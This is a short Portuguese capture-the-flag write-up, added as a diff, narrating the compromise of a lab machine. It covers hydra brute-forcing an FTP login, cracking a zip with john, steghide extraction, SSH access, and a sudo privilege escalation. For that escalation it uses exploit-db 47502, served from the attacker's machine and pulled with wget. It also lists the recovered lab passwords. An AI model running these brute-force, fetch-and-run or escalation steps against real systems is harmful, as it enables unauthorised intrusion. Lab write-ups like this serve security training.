@@ -1,0 +1,53 @@
+Apos varias tentativas encontrei a pagina que redireciona ao agent C /agent_C_attention.php
+
+Agora vamos usar o hydra no login chris para tentar pegar a senha ftp dele
+
+hydra -l chris -P /usr/share/wordlists/rockyou.txt "ip" ftp
+
+chris:crystal
+
+Ao entrar no servidor ftp damos get em todos os arquivos
+
+Ao ler o arquivo .txt ele diz que dentro de umas das fotos está nosso login e senha 
+
+Usamos o comando binwalk -e no arquivo cutie.png
+
+E ele nos retorna uma pasta com um arquivo zipado
+
+Agora precisamos usar o john para dar crack nele
+
+zip2john 8702.zip > zip.hashes
+
+sudo john zip.hashes e temos nossa senha: alien
+
+agora usamos o comando 7z e 8702.zip e colocamos a senha que conseguimos
+
+Agora podemos ler o arquivo .txt. Ele nos da outro conteudo "QXJlYTUx" 
+
+Agora usamos o comando echo "QXJlYTUx" | base64 -d e temos outra senha:Area51
+
+Usamos o comando steghide --extract -sf cute-alien.jpg e colocamos a nossa nova senha e temos um novo arquivo
+
+Temos um novo username e password: James:hackerrules!
+
+Tentamos fazer a conexao via ssh
+
+Ao entrar temos nossa user flag
+
+usamos sudo -l                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+(ALL, !root) /bin/bash                                                                                                                                                                                                                     
+                                                                                                                                                                                                                                           
+Ao fazer uma busca no google, encontrei um payload que nos ajudar                                                                                                                                                                          
+                                                                                                                                                                                                                                           
+https://www.exploit-db.com/exploits/47502                                                                                                                                                                                                  
+                                                                                                                                                                                                                                           
+Salvamos ele na nossa maquina e passamos para a maquina que estamos tentando pegar root                                                                                                                                                    
+                                                                                                                                                                                                                                           
+Usamos esse comando na nossa maquina aonde esta nosso payload: sudo python -m SimpleHTTPServer 80                                                                                                                                          
+                                                                                                                                                                                                                                           
+Agora na outra maquina usamos wget "nosso ip"/47502.py                                                                                                                                                                                     
+                                                                                                                                                                                                                                           
+Executamos o payload: python3 47502.py
+
+E somos root
